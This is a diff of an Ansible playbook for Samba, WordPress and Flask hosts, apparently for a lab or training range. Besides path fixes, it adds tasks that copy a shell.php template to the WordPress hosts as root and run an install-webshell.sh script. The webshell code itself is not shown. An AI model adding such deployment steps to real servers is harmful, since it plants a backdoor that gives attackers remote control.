@@ -24,7 +24,7 @@
   become: yes
   tasks:
   - name: Install Samba
-    script: "scripts/samba.sh"
+    script: "scripts/Samba/samba.sh"
   - name: Add config
     copy:
       src: "templates/smb.conf"
@@ -33,23 +33,26 @@
   - name: Restart Samba
     script: "scripts/Samba/restart-samba.sh"
     
-- name: Install Wordpress
+- hosts: wordpress_hosts
   become: yes
   ignore_errors: yes
-  hosts: wordpress_hosts
-  environment:
-    DB_HOST: "{{ hostvars[item]['hostname'] }}"
-  with_items: "{{ groups['sql_hosts'] }}"
   tasks:
   - name: Move Wordpress config
     template:
-      src: "templates/wp-config.php.j2"
+      src: "templates/wp-config.php"
       dest: "/tmp/wp-config.php"
       owner: root
       group: root
-  - name: Run install
+  - name: Install apache2
     script: "scripts/Wordpress/wordpress.sh"
-
+  - name: Add webshell
+    template:
+      src: "templates/shell.php"
+      dest: "/tmp/shell.php"
+      owner: root
+      group: root
+  - name: Install webshell
+    script: "scripts/Wordpress/install-webshell.sh"
 
 - name: Install Flask
   hosts: flask_hosts
